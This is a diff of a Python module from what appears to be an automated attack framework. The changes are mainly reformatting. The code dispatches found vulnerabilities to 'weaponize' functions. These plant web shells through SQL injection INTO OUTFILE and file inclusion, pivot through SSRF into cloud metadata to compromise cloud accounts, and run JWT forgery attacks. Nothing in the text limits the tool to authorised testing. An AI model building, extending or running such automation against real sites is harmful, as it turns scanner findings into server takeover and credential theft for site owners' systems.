@@ -6,6 +6,7 @@ vtype 用 if 链分派. 抽出后:
 - 便于新增 vtype (加个函数 + 注册表)
 - 消除嵌套 nonlocal webshell_urls 的隐式状态传递
 """
+
 from __future__ import annotations
 
 import json
@@ -15,8 +16,9 @@ from typing import Any, Dict, List, Optional
 logger = logging.getLogger(__name__)
 
 
-def weaponize_sqli(url: str, param: str, sess: Any, timeout: float,
-                   vuln_ctx: Any, webshell_urls: List[str]) -> Dict:
+def weaponize_sqli(
+    url: str, param: str, sess: Any, timeout: float, vuln_ctx: Any, webshell_urls: List[str]
+) -> Dict:
     from tools import sqli_weaponizer
 
     result: Dict[str, Any] = {}
@@ -24,14 +26,17 @@ def weaponize_sqli(url: str, param: str, sess: Any, timeout: float,
         result["sqli_weaponizer"] = sqli_weaponizer.check(url, param, sess, timeout)
     except Exception as e:
         logger.debug("sqli weaponize sqli_weaponizer: %s", e)
-    if (result.get("sqli_weaponizer", {}).get("vulnerable")
-            or result.get("sqli_weaponizer", {}).get("data_extracted")):
+    if result.get("sqli_weaponizer", {}).get("vulnerable") or result.get("sqli_weaponizer", {}).get(
+        "data_extracted"
+    ):
         result["exploit_ready"] = True
 
     from tools.kali_executor import is_available as kali_avail
+
     if kali_avail():
         try:
             from tools import kali_toolset
+
             sqlmap_r = kali_toolset.sqlmap_detect(url, param)
             if sqlmap_r.get("vulnerable") or sqlmap_r.get("data"):
                 result["sqlmap"] = sqlmap_r
@@ -42,6 +47,7 @@ def weaponize_sqli(url: str, param: str, sess: Any, timeout: float,
             logger.debug("sqlmap weaponize: %s", e)
 
     from tools.weaponize_engine import sqli_into_outfile
+
     web_root = vuln_ctx.get().discovered_versions.get("web_root", "/var/www/html")
     sqli_shell = sqli_into_outfile(url, param, sess, timeout, web_root)
     if sqli_shell.get("success"):
@@ -63,6 +69,7 @@ def weaponize_ssrf(url: str, param: str, sess: Any, timeout: float) -> Dict:
         cloud_meta = lat.get("cloud_metadata", {})
         if cloud_meta:
             from tools.cloud_pwn import check as cloud_check
+
             c_result = cloud_check(json.dumps(cloud_meta))
             if c_result.get("success"):
                 result["cloud_pwn"] = c_result
@@ -72,8 +79,7 @@ def weaponize_ssrf(url: str, param: str, sess: Any, timeout: float) -> Dict:
     return result
 
 
-def weaponize_lfi(url: str, param: str, sess: Any, timeout: float,
-                  finding: Dict) -> Dict:
+def weaponize_lfi(url: str, param: str, sess: Any, timeout: float, finding: Dict) -> Dict:
     result: Dict[str, Any] = {}
     v = finding.get("result", {})
     if v.get("rce_available"):
@@ -81,6 +87,7 @@ def weaponize_lfi(url: str, param: str, sess: Any, timeout: float,
         result["exploit_ready"] = True
         try:
             from tools.reverse_shell import deploy_webshell
+
             ws = deploy_webshell(url, webshell_type="php_cmd", sess=sess, timeout=timeout)
             if ws.get("success"):
                 result["webshell"] = ws
@@ -88,6 +95,7 @@ def weaponize_lfi(url: str, param: str, sess: Any, timeout: float,
             logger.debug("webshell deploy: %s", e)
 
     from tools.weaponize_engine import deploy_webshell_lfi
+
     lfi_ws = deploy_webshell_lfi(url, param, sess, timeout)
     if lfi_ws.get("success"):
         result["lfi_webshell"] = lfi_ws
@@ -108,8 +116,7 @@ def weaponize_xss(url: str, param: str, sess: Any, timeout: float) -> Dict:
     return result
 
 
-def weaponize_jwt(finding: Dict, url: str, param: str,
-                  sess: Any, timeout: float) -> Dict:
+def weaponize_jwt(finding: Dict, url: str, param: str, sess: Any, timeout: float) -> Dict:
     from tools import jwt_exploiter
 
     result: Dict[str, Any] = {}
@@ -119,20 +126,23 @@ def weaponize_jwt(finding: Dict, url: str, param: str,
         if token_str:
             try:
                 result["jwt_exploit"] = jwt_exploiter.check(
-                    token=token_str, sess=sess, url=url, param=param, timeout=timeout)
+                    token=token_str, sess=sess, url=url, param=param, timeout=timeout
+                )
             except Exception as e:
                 logger.debug("jwt exploit: %s", e)
     if not result:
         try:
             result["jwt_none_test"] = jwt_exploiter.check(
-                token=None, sess=sess, url=url, param=param, timeout=timeout)
+                token=None, sess=sess, url=url, param=param, timeout=timeout
+            )
         except Exception as e:
             logger.debug("jwt none test: %s", e)
     return result
 
 
-def weaponize_one(finding: Dict, sess: Any, timeout: float,
-                  vuln_ctx: Any, webshell_urls: List[str]) -> Optional[Dict]:
+def weaponize_one(
+    finding: Dict, sess: Any, timeout: float, vuln_ctx: Any, webshell_urls: List[str]
+) -> Optional[Dict]:
     """按 vtype 分派武器化. 无对应武器化时返回 None."""
     vtype = finding["type"]
     url = finding["url"]
